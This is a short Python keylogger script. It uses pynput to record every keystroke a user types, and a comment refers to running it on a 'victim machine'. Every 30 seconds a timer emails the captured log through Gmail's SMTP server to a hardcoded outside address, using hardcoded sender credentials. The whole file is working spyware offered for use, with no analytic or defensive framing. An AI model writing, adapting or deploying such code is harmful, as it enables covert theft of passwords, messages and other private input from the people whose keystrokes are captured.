import pynput.keyboard
import smtplib
import threading

log=""
def call_back(key):
    global log

    try:
    #log=log+key.char.encode("utf-8")
        log=log+str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        '''elif key ==key.shift_r:
                    log=log+" "'''
        else:
            log=log+str(key)

    #print(log)

def send_mail(mailfrom,mailfrompass,mailto,data):#to send mail of keylogg
    email_server=smtplib.SMTP("smtp.gmail.com",587)#gmail server
    email_server.starttls()#to start
    email_server.login(mailfrom,mailfrompass)#to make it log in automatically in victim machine
    email_server.sendmail(mailfrom,mailto,data)#to send >>from and to and message to b sent
    email_server.quit()#to quit this


def thread():
    global log
    send_mail("hackhacky07@gmail.com","********","snowfarin1507@gmailom",log)
    log = ""
    time=threading.Timer(30,thread)
    time.start()



keyboardlogger=pynput.keyboard.Listener(on_press=call_back)#on_press is a call back
with keyboardlogger:
    thread()
    keyboardlogger.join()


